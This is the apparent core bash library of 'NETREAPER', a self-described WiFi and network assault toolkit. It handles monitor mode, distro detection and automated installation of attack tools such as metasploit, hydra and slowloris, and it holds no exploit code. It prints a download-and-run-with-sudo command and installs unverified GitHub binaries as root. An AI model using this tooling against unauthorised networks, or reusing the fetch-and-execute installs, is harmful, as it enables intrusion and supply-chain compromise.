#!/usr/bin/env bash
#═══════════════════════════════════════════════════════════════════════════════
#
#    ███╗   ██╗███████╗████████╗██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
#    ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
#    ██╔██╗ ██║█████╗     ██║   ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
#    ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
#    ██║ ╚████║███████╗   ██║   ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
#    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
#
#    NETREAPER - Network Security & WiFi Assault Toolkit
#    Version: 6.2.1 "Phantom Protocol"
#
#    Copyright (c) 2025 OFFTRACKMEDIA Studios
#    Licensed under the Apache License, Version 2.0
#
#
#═══════════════════════════════════════════════════════════════════════════════

set -o pipefail

readonly VERSION="6.2.1"
readonly CODENAME="Phantom Protocol"
readonly SCRIPT_NAME="netreaper"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
readonly SCRIPT_DIR

# shellcheck disable=SC2034  # Exported for external use
JSON_OUTPUT=0
# shellcheck disable=SC2034  # State tracking for wireless operations
MONITOR_IFACE=""

# Dry-run mode - preview commands without executing
NR_DRY_RUN=0
export NR_DRY_RUN

#═══════════════════════════════════════════════════════════════════════════════
# COLOR DEFINITIONS
#═══════════════════════════════════════════════════════════════════════════════

# Check if colors are supported
if [[ -t 1 ]] && [[ "${NO_COLOR:-}" != "1" ]]; then
    # Reset
    C_RESET='\033[0m'
    
    # Basic colors
    C_BLACK='\033[0;30m'
    C_RED='\033[0;31m'
    C_GREEN='\033[0;32m'
    C_YELLOW='\033[0;33m'
    C_BLUE='\033[0;34m'
    C_PURPLE='\033[0;35m'
    C_CYAN='\033[0;36m'
    C_WHITE='\033[0;37m'
    
    # Bold colors
    C_BOLD='\033[1m'
    C_BRED='\033[1;31m'
    C_BGREEN='\033[1;32m'
    C_BYELLOW='\033[1;33m'
    C_BCYAN='\033[1;36m'
    
    # Custom theme colors
    C_FIRE='\033[1;31m'
    C_BLOOD='\033[0;31m'
    C_GHOST='\033[0;90m'
    C_SHADOW='\033[0;90m'
    C_BORDER='\033[0;36m'
    C_PROMPT='\033[0;33m'
    C_ORANGE='\033[0;33m'
    
    # Semantic aliases
    C_SUCCESS="$C_GREEN"
    C_ERROR="$C_RED"
    C_WARNING="$C_YELLOW"
    C_INFO="$C_CYAN"
else
    # No colors (exported for modules, hence shellcheck disable)
    # shellcheck disable=SC2034
    C_RESET='' C_BLACK='' C_RED='' C_GREEN='' C_YELLOW=''
    # shellcheck disable=SC2034
    C_BLUE='' C_PURPLE='' C_CYAN='' C_WHITE=''
    # shellcheck disable=SC2034
    C_BOLD='' C_BRED='' C_BGREEN='' C_BYELLOW='' C_BCYAN=''
    # shellcheck disable=SC2034
    C_FIRE='' C_BLOOD='' C_GHOST='' C_SHADOW='' C_BORDER=''
    # shellcheck disable=SC2034
    C_PROMPT='' C_ORANGE='' C_SUCCESS='' C_ERROR='' C_WARNING='' C_INFO=''
fi

# Legacy aliases to preserve existing styling (exported for modules)
# shellcheck disable=SC2034
readonly C_VENOM="${C_GREEN}"
# shellcheck disable=SC2034
readonly C_SKULL="${C_WHITE}"
# shellcheck disable=SC2034
readonly C_GOLD="${C_ORANGE}"

# Compatibility for legacy color references
[[ -z "${C_STEEL:-}" ]] && C_STEEL="${C_CYAN}"
[[ -z "${C_DIM:-}" ]] && C_DIM="${C_SHADOW}"

#═══════════════════════════════════════════════════════════════════════════════
# WIRELESS INTERFACE VALIDATION & MONITOR MODE (v5.3.0)
#═══════════════════════════════════════════════════════════════════════════════

# Check if an interface is wireless
is_wireless_interface() {
    local iface="$1"
    [[ -d "/sys/class/net/$iface/wireless" ]] || iw dev "$iface" info &>/dev/null
}

# List all available wireless interfaces
get_wireless_interfaces() {
    local interfaces=()
    for iface in /sys/class/net/*; do
        iface=$(basename "$iface")
        if [[ -d "/sys/class/net/$iface/wireless" ]]; then
            interfaces+=("$iface")
        fi
    done
    echo "${interfaces[@]}"
}

# Check if interface is in monitor mode (returns 0 if monitor, 1 if managed)
check_monitor_mode() {
    local iface="$1"
    local mode
    mode=$(iw dev "$iface" info 2>/dev/null | grep -oP 'type \K\w+')

    if [[ "$mode" == "monitor" ]]; then
        echo -e "${C_GREEN}[✓] $iface is in MONITOR mode${C_RESET}"
        return 0
    else
        echo -e "${C_YELLOW}[!] $iface is in MANAGED mode${C_RESET}"
        return 1
    fi
}

# Enable monitor mode with verification
enable_monitor_mode() {
    local iface="$1"
    local new_iface

    # Validate wireless
    if ! is_wireless_interface "$iface"; then
        echo -e "${C_RED}[!] $iface is not a wireless interface${C_RESET}"
        echo -e "${C_SHADOW}    Available wireless interfaces:${C_RESET}"
        for w in $(get_wireless_interfaces); do
            echo -e "      • $w"
        done
        return 1
    fi

    echo -e "${C_CYAN}[*] Enabling monitor mode on $iface...${C_RESET}"

    # Kill conflicting processes
    airmon-ng check kill &>/dev/null

    # Enable monitor mode
    airmon-ng start "$iface" &>/dev/null

    # Wait for interface
    sleep 2

    # Check for new interface name (wlan0mon or wlan0)
    if [[ -d "/sys/class/net/${iface}mon" ]]; then
        new_iface="${iface}mon"
    else
        new_iface="$iface"
    fi

    # Verify
    if check_monitor_mode "$new_iface"; then
        echo -e "${C_GREEN}[✓] Monitor mode ENABLED on $new_iface${C_RESET}"
        MONITOR_IFACE="$new_iface"
        return 0
    else
        echo -e "${C_RED}[!] Failed to enable monitor mode${C_RESET}"
        return 1
    fi
}

# Disable monitor mode with verification
# shellcheck disable=SC2034  # MONITOR_IFACE is global state
disable_monitor_mode() {
    local iface="$1"

    echo -e "${C_CYAN}[*] Disabling monitor mode on $iface...${C_RESET}"

    # Stop monitor mode
    airmon-ng stop "$iface" &>/dev/null

    # Restart NetworkManager
    systemctl start NetworkManager 2>/dev/null
    service network-manager start 2>/dev/null

    sleep 2

    # Get original interface name
    local orig_iface="${iface%mon}"

    # Verify
    if ! check_monitor_mode "$orig_iface" 2>/dev/null; then
        echo -e "${C_GREEN}[✓] Monitor mode DISABLED${C_RESET}"
        MONITOR_IFACE=""
        return 0
    else
        echo -e "${C_RED}[!] Failed to disable monitor mode${C_RESET}"
        return 1
    fi
}

# Wrapper function for WiFi operations - call this before any wireless tool
validate_wireless_interface() {
    local iface="$1"
    local require_monitor="${2:-false}"

    # Check if interface exists
    if [[ ! -d "/sys/class/net/$iface" ]]; then
        echo -e "${C_RED}[!] Interface $iface does not exist${C_RESET}"
        echo -e "${C_SHADOW}    Available interfaces:${C_RESET}"
        ls /sys/class/net/ | while read -r i; do echo "      • $i"; done
        return 1
    fi

    # Check if wireless
    if ! is_wireless_interface "$iface"; then
        echo -e "${C_RED}[!] $iface is not a wireless interface${C_RESET}"
        local wireless=($(get_wireless_interfaces))
        if [[ ${#wireless[@]} -gt 0 ]]; then
            echo -e "${C_SHADOW}    Available wireless interfaces:${C_RESET}"
            for w in "${wireless[@]}"; do
                echo -e "      • $w"
            done
        else
            echo -e "${C_RED}[!] No wireless interfaces found${C_RESET}"
        fi
        return 1
    fi

    # Check monitor mode if required
    if [[ "$require_monitor" == "true" ]]; then
        if ! check_monitor_mode "$iface" &>/dev/null; then
            echo -e "${C_YELLOW}[!] $iface is not in monitor mode${C_RESET}"
            read -rp "    Enable monitor mode? [Y/n]: " enable_mon
            if [[ "${enable_mon,,}" != "n" ]]; then
                enable_monitor_mode "$iface" || return 1
            else
                return 1
            fi
        fi
    fi

    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# SYSTEM DETECTION - Multi-Distro Support (v5.2.0)
#═══════════════════════════════════════════════════════════════════════════════

# Detected system info (populated by detect_system)
declare -g DISTRO=""
declare -g DISTRO_FAMILY=""
declare -g PKG_MANAGER=""
declare -g PKG_INSTALL=""
declare -g PKG_UPDATE=""
declare -g PKG_SEARCH=""
declare -g PKG_REMOVE=""

# Detect Linux distribution
# NOTE: We parse instead of source to avoid VERSION variable conflicts with /etc/os-release
detect_distro() {
    local distro=""

    if [[ -f /etc/os-release ]]; then
        # Parse instead of source to avoid variable conflicts (VERSION, etc.)
        distro=$(grep -oP '^ID=\K.*' /etc/os-release | tr -d '"')
    elif [[ -f /etc/lsb-release ]]; then
        distro=$(grep -oP '^DISTRIB_ID=\K.*' /etc/lsb-release | tr -d '"' | tr '[:upper:]' '[:lower:]')
    elif [[ -f /etc/debian_version ]]; then
        distro="debian"
    elif [[ -f /etc/fedora-release ]]; then
        distro="fedora"
    elif [[ -f /etc/centos-release ]]; then
        distro="centos"
    elif [[ -f /etc/arch-release ]]; then
        distro="arch"
    elif [[ -f /etc/gentoo-release ]]; then
        distro="gentoo"
    elif [[ -f /etc/alpine-release ]]; then
        distro="alpine"
    fi

    echo "${distro:-unknown}"
}

# Detect distro family
detect_distro_family() {
    local distro="$1"

    case "$distro" in
        debian|ubuntu|kali|parrot|linuxmint|pop|elementary|zorin|mx)
            echo "debian"
            ;;
        fedora|rhel|centos|rocky|alma|oracle|amazon)
            echo "redhat"
            ;;
        arch|manjaro|endeavouros|blackarch|arcolinux|garuda)
            echo "arch"
            ;;
        opensuse*|suse|sles)
            echo "suse"
            ;;
        alpine)
            echo "alpine"
            ;;
        gentoo|funtoo)
            echo "gentoo"
            ;;
        void)
            echo "void"
            ;;
        *)
            echo "unknown"
            ;;
    esac
}

# Detect and set package manager
# shellcheck disable=SC2034  # PKG_* vars available for external scripts/modules
detect_package_manager() {
    if command -v apt-get &>/dev/null; then
        PKG_MANAGER="apt"
        PKG_INSTALL="apt-get install -y"
        PKG_UPDATE="apt-get update"
        PKG_SEARCH="apt-cache search"
        PKG_REMOVE="apt-get remove -y"
    elif command -v dnf &>/dev/null; then
        PKG_MANAGER="dnf"
        PKG_INSTALL="dnf install -y"
        PKG_UPDATE="dnf check-update"
        PKG_SEARCH="dnf search"
        PKG_REMOVE="dnf remove -y"
    elif command -v yum &>/dev/null; then
        PKG_MANAGER="yum"
        PKG_INSTALL="yum install -y"
        PKG_UPDATE="yum check-update"
        PKG_SEARCH="yum search"
        PKG_REMOVE="yum remove -y"
    elif command -v pacman &>/dev/null; then
        PKG_MANAGER="pacman"
        PKG_INSTALL="pacman -S --noconfirm"
        PKG_UPDATE="pacman -Sy"
        PKG_SEARCH="pacman -Ss"
        PKG_REMOVE="pacman -R --noconfirm"
    elif command -v zypper &>/dev/null; then
        PKG_MANAGER="zypper"
        PKG_INSTALL="zypper install -y"
        PKG_UPDATE="zypper refresh"
        PKG_SEARCH="zypper search"
        PKG_REMOVE="zypper remove -y"
    elif command -v apk &>/dev/null; then
        PKG_MANAGER="apk"
        PKG_INSTALL="apk add"
        PKG_UPDATE="apk update"
        PKG_SEARCH="apk search"
        PKG_REMOVE="apk del"
    elif command -v emerge &>/dev/null; then
        PKG_MANAGER="emerge"
        PKG_INSTALL="emerge"
        PKG_UPDATE="emerge --sync"
        PKG_SEARCH="emerge --search"
        PKG_REMOVE="emerge --unmerge"
    elif command -v xbps-install &>/dev/null; then
        PKG_MANAGER="xbps"
        PKG_INSTALL="xbps-install -y"
        PKG_UPDATE="xbps-install -S"
        PKG_SEARCH="xbps-query -Rs"
        PKG_REMOVE="xbps-remove -y"
    else
        PKG_MANAGER="unknown"
        return 1
    fi

    return 0
}

# Main system detection - call on startup
detect_system() {
    DISTRO=$(detect_distro)
    DISTRO_FAMILY=$(detect_distro_family "$DISTRO")

    if ! detect_package_manager; then
        echo -e "${C_RED}[!] Could not detect package manager${C_RESET}"
        echo -e "${C_SHADOW}    Supported: apt, dnf, yum, pacman, zypper, apk, emerge, xbps${C_RESET}"
        return 1
    fi

    return 0
}

# Show detected system info
show_system_info() {
    echo -e "    ${C_CYAN}System Information:${C_RESET}"
    echo -e "    ${C_SHADOW}├─${C_RESET} Distro: ${C_GREEN}${DISTRO}${C_RESET}"
    echo -e "    ${C_SHADOW}├─${C_RESET} Family: ${C_GREEN}${DISTRO_FAMILY}${C_RESET}"
    echo -e "    ${C_SHADOW}└─${C_RESET} Package Manager: ${C_GREEN}${PKG_MANAGER}${C_RESET}"
}

#═══════════════════════════════════════════════════════════════════════════════
# PACKAGE NAME MAPPING
#═══════════════════════════════════════════════════════════════════════════════

# Get the correct package name for current distro
# Usage: pkg=$(get_package_name "nmap")
get_package_name() {
    local tool="$1"
    local pkg=""

    case "$tool" in
        # SCANNING
        nmap|masscan|netdiscover)
            pkg="$tool"
            ;;

        # WIRELESS
        aircrack-ng|kismet|wifite|reaver|bully|mdk4)
            pkg="$tool"
            ;;
        hcxdumptool)
            case "$DISTRO_FAMILY" in
                debian) pkg="hcxdumptool" ;;
                arch)   pkg="hcxdumptool" ;;
                *)      pkg="" ;;
            esac
            ;;

        # EXPLOITATION
        metasploit-framework|metasploit)
            case "$DISTRO_FAMILY" in
                debian) pkg="metasploit-framework" ;;
                arch)   pkg="metasploit" ;;
                *)      pkg="" ;;
            esac
            ;;
        exploitdb|searchsploit)
            case "$DISTRO_FAMILY" in
                debian) pkg="exploitdb" ;;
                arch)   pkg="exploitdb" ;;
                *)      pkg="" ;;
            esac
            ;;

        # CREDENTIALS
        hashcat|john|hydra|medusa|ncrack)
            pkg="$tool"
            ;;

        # WEB
        nikto|dirb|whatweb)
            pkg="$tool"
            ;;
        sqlmap)
            case "$DISTRO_FAMILY" in
                debian|arch) pkg="sqlmap" ;;
                *)           pkg="" ;;
            esac
            ;;
        gobuster)
            case "$DISTRO_FAMILY" in
                debian) pkg="gobuster" ;;
                arch)   pkg="gobuster" ;;
                *)      pkg="" ;;
            esac
            ;;
        wpscan)
            case "$DISTRO_FAMILY" in
                debian) pkg="wpscan" ;;
                *)      pkg="" ;;
            esac
            ;;

        # TRAFFIC
        wireshark)
            case "$DISTRO_FAMILY" in
                arch) pkg="wireshark-qt" ;;
                *)    pkg="wireshark" ;;
            esac
            ;;
        tcpdump|tshark|ettercap|bettercap)
            pkg="$tool"
            ;;

        # OSINT
        theharvester)
            case "$DISTRO_FAMILY" in
                debian) pkg="theharvester" ;;
                *)      pkg="" ;;
            esac
            ;;
        maltego|recon-ng|spiderfoot)
            case "$DISTRO_FAMILY" in
                debian) pkg="$tool" ;;
                *)      pkg="" ;;
            esac
            ;;

        # STRESS
        hping3)
            pkg="hping3"
            ;;
        slowloris)
            pkg=""  # pip install
            ;;

        # UTILITIES
        netcat)
            case "$DISTRO_FAMILY" in
                debian) pkg="netcat-openbsd" ;;
                redhat) pkg="nmap-ncat" ;;
                arch)   pkg="openbsd-netcat" ;;
                *)      pkg="netcat" ;;
            esac
            ;;
        curl|wget|git|unzip|jq|socat|proxychains|tor)
            pkg="$tool"
            ;;
        python3-pip|pip)
            case "$DISTRO_FAMILY" in
                debian) pkg="python3-pip" ;;
                redhat) pkg="python3-pip" ;;
                arch)   pkg="python-pip" ;;
                suse)   pkg="python3-pip" ;;
                alpine) pkg="py3-pip" ;;
                *)      pkg="python3-pip" ;;
            esac
            ;;
        build-essential)
            case "$DISTRO_FAMILY" in
                debian) pkg="build-essential" ;;
                redhat) pkg="gcc make" ;;
                arch)   pkg="base-devel" ;;
                suse)   pkg="gcc make" ;;
                alpine) pkg="build-base" ;;
                *)      pkg="" ;;
            esac
            ;;
        golang|go)
            case "$DISTRO_FAMILY" in
                debian) pkg="golang-go" ;;
                redhat) pkg="golang" ;;
                arch)   pkg="go" ;;
                suse)   pkg="go" ;;
                *)      pkg="" ;;
            esac
            ;;

        # Default - try same name
        *)
            pkg="$tool"
            ;;
    esac

    echo "$pkg"
}

#═══════════════════════════════════════════════════════════════════════════════
# UNIVERSAL PACKAGE INSTALLATION
#═══════════════════════════════════════════════════════════════════════════════

# Check if a tool is installed
check_tool_installed() {
    local tool="$1"
    local binary="${2:-$tool}"
    command -v "$binary" &>/dev/null
}

# Install a package using detected package manager
pkg_install() {
    local package="$1"
    [[ -z "$package" ]] && return 1

    case "$PKG_MANAGER" in
        apt)
            DEBIAN_FRONTEND=noninteractive apt-get install -y "$package" &>/dev/null
            ;;
        dnf)
            dnf install -y "$package" &>/dev/null
            ;;
        yum)
            yum install -y "$package" &>/dev/null
            ;;
        pacman)
            pacman -S --noconfirm --needed "$package" &>/dev/null
            ;;
        zypper)
            zypper install -y "$package" &>/dev/null
            ;;
        apk)
            apk add "$package" &>/dev/null
            ;;
        emerge)
            emerge "$package" &>/dev/null
            ;;
        xbps)
            xbps-install -y "$package" &>/dev/null
            ;;
        *)
            return 1
            ;;
    esac
}

# Update package lists
pkg_update() {
    echo -e "    ${C_CYAN}○${C_RESET} Updating package lists..."

    case "$PKG_MANAGER" in
        apt)
            apt-get update &>/dev/null
            ;;
        dnf)
            dnf check-update &>/dev/null || true
            ;;
        yum)
            yum check-update &>/dev/null || true
            ;;
        pacman)
            pacman -Sy &>/dev/null
            ;;
        zypper)
            zypper refresh &>/dev/null
            ;;
        apk)
            apk update &>/dev/null
            ;;
        emerge)
            emerge --sync &>/dev/null
            ;;
        xbps)
            xbps-install -S &>/dev/null
            ;;
    esac

    echo -e "\r    ${C_GREEN}✓${C_RESET} Package lists updated    "
}

# Install a tool with fallback methods
install_tool() {
    local tool="$1"
    local binary="${2:-$tool}"

    # Already installed?
    if check_tool_installed "$tool" "$binary"; then
        echo -e "    ${C_GREEN}✓${C_RESET} $tool ${C_SHADOW}(installed)${C_RESET}"
        return 0
    fi

    echo -ne "    ${C_CYAN}○${C_RESET} Installing $tool..."

    # Get distro-specific package name
    local package
    package=$(get_package_name "$tool")

    # Method 1: Package manager
    if [[ -n "$package" ]]; then
        if pkg_install "$package"; then
            if check_tool_installed "$tool" "$binary"; then
                echo -e "\r    ${C_GREEN}✓${C_RESET} $tool                    "
                return 0
            fi
        fi
    fi

    # Method 2: pip
    if command -v pip3 &>/dev/null; then
        if pip3 install "$tool" --user --break-system-packages &>/dev/null 2>&1 || \
           pip3 install "$tool" --user &>/dev/null 2>&1; then
            if check_tool_installed "$tool" "$binary"; then
                echo -e "\r    ${C_GREEN}✓${C_RESET} $tool ${C_SHADOW}(pip)${C_RESET}          "
                return 0
            fi
        fi
    fi

    # Method 3: Go install
    if command -v go &>/dev/null; then
        case "$tool" in
            gobuster)
                go install github.com/OJ/gobuster/v3@latest &>/dev/null
                ;;
            ffuf)
                go install github.com/ffuf/ffuf@latest &>/dev/null
                ;;
            nuclei)
                go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest &>/dev/null
                ;;
            httpx)
                go install github.com/projectdiscovery/httpx/cmd/httpx@latest &>/dev/null
                ;;
            subfinder)
                go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest &>/dev/null
                ;;
        esac

        if check_tool_installed "$tool" "$binary"; then
            echo -e "\r    ${C_GREEN}✓${C_RESET} $tool ${C_SHADOW}(go)${C_RESET}           "
            return 0
        fi
    fi

    # Method 4: GitHub release
    if install_from_github "$tool"; then
        echo -e "\r    ${C_GREEN}✓${C_RESET} $tool ${C_SHADOW}(github)${C_RESET}       "
        return 0
    fi

    # All methods failed
    echo -e "\r    ${C_RED}✗${C_RESET} $tool ${C_SHADOW}(unavailable for $DISTRO)${C_RESET}"
    return 1
}

# Install from GitHub releases
install_from_github() {
    local tool="$1"
    local repo=""

    # Map tools to GitHub repos
    case "$tool" in
        rustscan)     repo="RustScan/RustScan" ;;
        nuclei)       repo="projectdiscovery/nuclei" ;;
        httpx)        repo="projectdiscovery/httpx" ;;
        subfinder)    repo="projectdiscovery/subfinder" ;;
        amass)        repo="owasp-amass/amass" ;;
        *)            return 1 ;;
    esac

    local api_url="https://api.github.com/repos/$repo/releases/latest"
    local release_json

    release_json=$(curl -sL --connect-timeout 10 "$api_url") || return 1

    # Find binary for architecture
    local arch
    arch=$(uname -m)
    case "$arch" in
        x86_64)  arch="amd64\|x86_64\|linux64" ;;
        aarch64) arch="arm64\|aarch64" ;;
        armv7l)  arch="armv7\|arm\|armhf" ;;
        *)       arch="$arch" ;;
    esac

    local download_url
    download_url=$(echo "$release_json" | grep -oP '"browser_download_url":\s*"\K[^"]+' | \
        grep -iE "linux.*($arch)" | grep -vE '\.sha256|\.sig|\.asc|\.txt' | head -1)

    [[ -z "$download_url" ]] && return 1

    local tmp_file="/tmp/${tool}_download_$$"
    curl -sL --connect-timeout 10 --max-time 120 "$download_url" -o "$tmp_file" || return 1

    # Handle different archive types
    case "$download_url" in
        *.deb)
            dpkg -i "$tmp_file" &>/dev/null
            # Fix dependencies using the detected package manager
            if [[ "$PKG_MANAGER" == "apt" ]]; then
                apt-get install -f -y &>/dev/null
            fi
            ;;
        *.rpm)
            rpm -i "$tmp_file" &>/dev/null || dnf install -y "$tmp_file" &>/dev/null
            ;;
        *.tar.gz|*.tgz)
            local extract_dir="/tmp/${tool}_extract_$$"
            mkdir -p "$extract_dir"
            tar -xzf "$tmp_file" -C "$extract_dir" &>/dev/null
            local binary
            binary=$(find "$extract_dir" -type f -executable -name "*$tool*" 2>/dev/null | head -1)
            [[ -z "$binary" ]] && binary=$(find "$extract_dir" -type f -executable 2>/dev/null | head -1)
            [[ -n "$binary" ]] && install -m 755 "$binary" /usr/local/bin/"$tool"
            rm -rf "$extract_dir"
            ;;
        *.zip)
            local extract_dir="/tmp/${tool}_extract_$$"
            mkdir -p "$extract_dir"
            unzip -q "$tmp_file" -d "$extract_dir" &>/dev/null
            local binary
            binary=$(find "$extract_dir" -type f -executable 2>/dev/null | head -1)
            [[ -n "$binary" ]] && install -m 755 "$binary" /usr/local/bin/"$tool"
            rm -rf "$extract_dir"
            ;;
        *)
            install -m 755 "$tmp_file" /usr/local/bin/"$tool"
            ;;
    esac

    rm -f "$tmp_file"
    command -v "$tool" &>/dev/null
}

#═══════════════════════════════════════════════════════════════════════════════
# DISTRO-SPECIFIC SETUP
#═══════════════════════════════════════════════════════════════════════════════

# Setup additional repos for security tools
setup_repos() {
    case "$DISTRO_FAMILY" in
        redhat)
            # RHEL/CentOS/Rocky/Alma need EPEL
            if [[ "$DISTRO" != "fedora" ]]; then
                if ! rpm -q epel-release &>/dev/null; then
                    echo -e "    ${C_CYAN}○${C_RESET} Installing EPEL repository..."
                    dnf install -y epel-release &>/dev/null || \
                    yum install -y epel-release &>/dev/null
                    echo -e "\r    ${C_GREEN}✓${C_RESET} EPEL repository installed    "
                fi
            fi
            ;;

        arch)
            if [[ "$DISTRO" != "blackarch" ]]; then
                echo -e "    ${C_YELLOW}!${C_RESET} For more tools, consider BlackArch repo:"
                echo -e "      ${C_SHADOW}curl -O https://blackarch.org/strap.sh && sudo ./strap.sh${C_RESET}"
            fi
            ;;

        suse)
            echo -e "    ${C_YELLOW}!${C_RESET} Some tools may need security repos on openSUSE"
            ;;
    esac
}

# Install base dependencies
install_base_deps() {
    echo -e "\n${C_CYAN}[*] Installing base dependencies...${C_RESET}"

    local deps=(curl wget git unzip jq)

    # Add distro-specific build tools
    case "$DISTRO_FAMILY" in
        debian)  deps+=(python3-pip build-essential) ;;
        redhat)  deps+=(python3-pip gcc make) ;;
        arch)    deps+=(python-pip base-devel) ;;
        suse)    deps+=(python3-pip gcc make) ;;
        alpine)  deps+=(py3-pip build-base) ;;
    esac

    for dep in "${deps[@]}"; do
        install_tool "$dep" || true
    done

    # Install Go if not present
    if ! command -v go &>/dev/null; then
        install_tool "golang" "go"
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# STARTUP INITIALIZATION
#═══════════════════════════════════════════════════════════════════════════════

# Initialize system - call this early in script
init_system() {
    # Detect system
    if ! detect_system; then
        echo -e "${C_RED}╔═══════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "${C_RED}║  UNSUPPORTED SYSTEM                                       ║${C_RESET}"
        echo -e "${C_RED}╠═══════════════════════════════════════════════════════════╣${C_RESET}"
        echo -e "${C_RED}║  Could not detect a supported package manager.            ║${C_RESET}"
        echo -e "${C_RED}║                                                           ║${C_RESET}"
        echo -e "${C_RED}║  Supported:                                               ║${C_RESET}"
        echo -e "${C_RED}║    • apt    (Debian, Ubuntu, Kali, Parrot)                ║${C_RESET}"
        echo -e "${C_RED}║    • dnf    (Fedora, RHEL 8+, Rocky, Alma)                ║${C_RESET}"
        echo -e "${C_RED}║    • yum    (RHEL 7, CentOS 7)                            ║${C_RESET}"
        echo -e "${C_RED}║    • pacman (Arch, Manjaro, BlackArch)                    ║${C_RESET}"
        echo -e "${C_RED}║    • zypper (openSUSE, SUSE)                              ║${C_RESET}"
        echo -e "${C_RED}║    • apk    (Alpine)                                      ║${C_RESET}"
        echo -e "${C_RED}╚═══════════════════════════════════════════════════════════╝${C_RESET}"
        exit 1
    fi
}

# Show system banner (optional - for verbose mode)
show_system_banner() {
    echo -e "${C_SHADOW}┌─────────────────────────────────────┐${C_RESET}"
    echo -e "${C_SHADOW}│${C_RESET} System: ${C_GREEN}${DISTRO}${C_RESET} (${DISTRO_FAMILY})"
    echo -e "${C_SHADOW}│${C_RESET} Package Manager: ${C_GREEN}${PKG_MANAGER}${C_RESET}"
    echo -e "${C_SHADOW}└─────────────────────────────────────┘${C_RESET}"
}

#═══════════════════════════════════════════════════════════════════════════════
# DIRECTORY & FILE SETUP
#═══════════════════════════════════════════════════════════════════════════════

NETREAPER_HOME="${HOME}/.netreaper"
CONFIG_DIR="${NETREAPER_HOME}/config"
CONFIG_FILE="${CONFIG_DIR}/netreaper.conf"
LOG_DIR="${NETREAPER_HOME}/logs"
OUTPUT_DIR="${NETREAPER_HOME}/output"
LOOT_DIR="${NETREAPER_HOME}/loot"
SESSION_DIR="${NETREAPER_HOME}/sessions"
HISTORY_FILE="${NETREAPER_HOME}/target_history"

# Log files
LOG_FILE="${LOG_DIR}/netreaper_$(date +%Y%m%d).log"
AUDIT_LOG="${LOG_DIR}/audit.log"

# Runtime flags
VERBOSE="${VERBOSE:-false}"
DEBUG="${DEBUG:-false}"
QUIET="${QUIET:-false}"

# Handle legacy config file path (previously a file at $CONFIG_DIR)
if [[ -e "$CONFIG_DIR" && ! -d "$CONFIG_DIR" ]]; then
    LEGACY_CONFIG_BACKUP="${CONFIG_DIR}.bak.$(date +%Y%m%d%H%M%S)"
    mv "$CONFIG_DIR" "$LEGACY_CONFIG_BACKUP" 2>/dev/null || cp "$CONFIG_DIR" "$LEGACY_CONFIG_BACKUP" 2>/dev/null
    mkdir -p "$CONFIG_DIR"
    mv "$LEGACY_CONFIG_BACKUP" "$CONFIG_FILE" 2>/dev/null || cp "$LEGACY_CONFIG_BACKUP" "$CONFIG_FILE" 2>/dev/null
fi

# Create all directories on load
mkdir -p "$CONFIG_DIR" "$LOG_DIR" "$OUTPUT_DIR" "$LOOT_DIR" "$SESSION_DIR" 2>/dev/null
chmod 700 "$NETREAPER_HOME" 2>/dev/null
touch "$LOG_FILE" "$AUDIT_LOG" 2>/dev/null

# Migrate legacy flat-file locations into new structure
for legacy_file in "$NETREAPER_HOME/favorites" "$NETREAPER_HOME/aliases"; do
    dest_path="$CONFIG_DIR/$(basename "$legacy_file")"
    if [[ -f "$legacy_file" && ! -f "$dest_path" ]]; then
        mv "$legacy_file" "$dest_path" 2>/dev/null || cp "$legacy_file" "$dest_path" 2>/dev/null
    fi
done

if [[ -f "$NETREAPER_HOME/history" && ! -f "$HISTORY_FILE" ]]; then
    mv "$NETREAPER_HOME/history" "$HISTORY_FILE" 2>/dev/null || cp "$NETREAPER_HOME/history" "$HISTORY_FILE" 2>/dev/null
fi

# Compatibility/legacy paths (exported for modules)
# shellcheck disable=SC2034
BASE_LOG_DIR="$LOG_DIR"
# shellcheck disable=SC2034
BASE_OUTPUT_DIR="$OUTPUT_DIR"
# shellcheck disable=SC2034
BASE_LOOT_DIR="$LOOT_DIR"
SESSIONS_DIR="$SESSION_DIR"
SESSION_FILE="${SESSION_DIR}/.current_session"
LEGAL_FILE="${CONFIG_DIR}/.legal_accepted"
FAVORITES_FILE="${CONFIG_DIR}/favorites"
ALIASES_FILE="${CONFIG_DIR}/aliases"
PROFILES_DIR="${CONFIG_DIR}/profiles"
TMP_DIR="/tmp/netreaper"
CURRENT_SESSION=""
SESSION_NAME=""

DEFAULT_INTERFACE=""
DEFAULT_WORDLIST="/usr/share/wordlists/rockyou.txt"
DEFAULT_THEME="default"

#═══════════════════════════════════════════════════════════════════════════════
# CORE FUNCTIONS - v5.1.0 FIX
#═══════════════════════════════════════════════════════════════════════════════

#───────────────────────────────────────────────────────────────────────────────
# TIMING FUNCTIONS
#───────────────────────────────────────────────────────────────────────────────

declare -g TIMER_START_MS=0

start_timer_ms() {
    if [[ -f /proc/uptime ]]; then
        TIMER_START_MS=$(awk '{printf "%.0f", $1 * 1000}' /proc/uptime 2>/dev/null) || TIMER_START_MS=$(($(date +%s) * 1000))
    else
        TIMER_START_MS=$(($(date +%s) * 1000))
    fi
}

end_timer_ms() {
    local end_ms
    if [[ -f /proc/uptime ]]; then
        end_ms=$(awk '{printf "%.0f", $1 * 1000}' /proc/uptime 2>/dev/null) || end_ms=$(($(date +%s) * 1000))
    else
        end_ms=$(($(date +%s) * 1000))
    fi
    
    local duration_ms=$((end_ms - TIMER_START_MS))
    
    if ((duration_ms < 0)); then
        echo "0ms"
    elif ((duration_ms < 1000)); then
        echo "${duration_ms}ms"
    elif ((duration_ms < 60000)); then
        printf "%d.%ds" $((duration_ms / 1000)) $((duration_ms % 1000 / 100))
    else
        printf "%dm %ds" $((duration_ms / 60000)) $(((duration_ms % 60000) / 1000))
    fi
}

# Aliases for compatibility
